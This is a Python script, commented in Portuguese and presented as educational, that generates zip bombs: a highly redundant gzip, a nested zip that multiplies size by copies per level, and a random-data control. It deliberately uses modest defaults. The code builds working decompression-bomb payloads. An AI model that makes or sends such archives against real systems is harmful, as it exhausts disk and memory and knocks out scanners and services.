#!/usr/bin/env python3
"""Gerador didático de zip bombs.

Duas construções clássicas + um grupo de controle:

  simples   arquivo altamente redundante comprimido uma vez.
            Razão limitada pelo teto do DEFLATE (~1032:1 por fluxo).
  aninhada  zip contendo k cópias de um zip, por n níveis.
            O total descomprimido multiplica: fundo * k**n.
  controle  bytes aleatórios no mesmo pipeline.
            Mostra que sem redundância não há bomba (~1:1).

Os defaults são deliberadamente modestos (GB, não TB/PB): o objetivo
é estudar o mecanismo, não lotar disco de ninguém.

Exemplos:
    python3 gerador.py simples
    python3 gerador.py aninhada --niveis 3 --copias 4
    python3 gerador.py controle
"""
from __future__ import annotations

import argparse
import gzip
import io
import os
import zipfile

CHUNK = 1 << 20  # 1 MiB: tudo em streaming, o conteúdo inteiro nunca vai pra RAM


def fmt(n: float) -> str:
    for unidade in ("B", "KiB", "MiB", "GiB", "TiB"):
        if n < 1024:
            return f"{n:.1f} {unidade}"
        n /= 1024
    return f"{n:.1f} PiB"


def gerar_simples(destino: str, tamanho: int, aleatorio: bool = False) -> None:
    """Comprime `tamanho` bytes em streaming (zeros ou aleatório)."""
    with gzip.open(destino, "wb", compresslevel=9) as f:
        escritos = 0
        while escritos < tamanho:
            f.write(os.urandom(CHUNK) if aleatorio else b"\0" * CHUNK)
            escritos += CHUNK

    comprimido = os.path.getsize(destino)
    print(f"[{destino}]")
    print(f"  descomprimido: {fmt(tamanho)}")
    print(f"  comprimido:    {fmt(comprimido)}")
    print(f"  razão:         {tamanho / comprimido:.1f}:1")


def gerar_aninhada(destino: str, fundo: int, niveis: int, copias: int) -> None:
    """Zip com `copias` cópias do zip anterior, `niveis` vezes.

    Cada nível multiplica por `copias` o total que seria materializado
    se alguém extraísse tudo recursivamente. As cópias de um mesmo nível
    são entradas independentes no zip — o ganho vem da multiplicação
    estrutural, não da compressão entre cópias.
    """
    # camada mais interna: um zip com um único arquivo redundante
    interno = io.BytesIO()
    with zipfile.ZipFile(interno, "w", zipfile.ZIP_DEFLATED) as z:
        with z.open("zeros.bin", "w") as entrada:
            escritos = 0
            while escritos < fundo:
                entrada.write(b"\0" * CHUNK)
                escritos += CHUNK

    dados = interno.getvalue()
    for nivel in range(niveis):
        novo = io.BytesIO()
        with zipfile.ZipFile(novo, "w", zipfile.ZIP_DEFLATED) as z:
            for i in range(copias):
                z.writestr(f"nivel{nivel + 1}_copia{i:02d}.zip", dados)
        dados = novo.getvalue()

    with open(destino, "wb") as f:
        f.write(dados)

    total = fundo * copias**niveis
    print(f"[{destino}]")
    print(f"  estrutura:     fundo de {fmt(fundo)} x {copias}^{niveis} cópias")
    print(f"  arquivo final: {fmt(len(dados))}")
    print(f"  se extraído:   {fmt(total)}")
    print(f"  razão:         {total / len(dados):.1f}:1")


def main() -> None:
    ap = argparse.ArgumentParser(description="Gerador didático de zip bombs")
    sub = ap.add_subparsers(dest="tipo", required=True)

    ps = sub.add_parser("simples", help="arquivo redundante comprimido uma vez (~1032:1)")
    ps.add_argument("--tamanho-mib", type=int, default=1024)

    pa = sub.add_parser("aninhada", help="zip com k cópias em n níveis (multiplicação)")
    pa.add_argument("--fundo-mib", type=int, default=100)
    pa.add_argument("--niveis", type=int, default=3)
    pa.add_argument("--copias", type=int, default=4)

    pc = sub.add_parser("controle", help="bytes aleatórios: sem redundância não há bomba")
    pc.add_argument("--tamanho-mib", type=int, default=64)

    for p in (ps, pa, pc):
        p.add_argument(
            "--destino",
            default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "artefatos"),
            help="diretório de saída (default: artefatos/ ao lado do script)",
        )

    args = ap.parse_args()
    os.makedirs(args.destino, exist_ok=True)

    if args.tipo == "simples":
        gerar_simples(os.path.join(args.destino, "bomba_simples.gz"), args.tamanho_mib << 20)
    elif args.tipo == "controle":
        gerar_simples(
            os.path.join(args.destino, "controle_aleatorio.gz"),
            args.tamanho_mib << 20,
            aleatorio=True,
        )
    else:
        gerar_aninhada(
            os.path.join(args.destino, "bomba_aninhada.zip"),
            args.fundo_mib << 20,
            args.niveis,
            args.copias,
        )


if __name__ == "__main__":
    main()
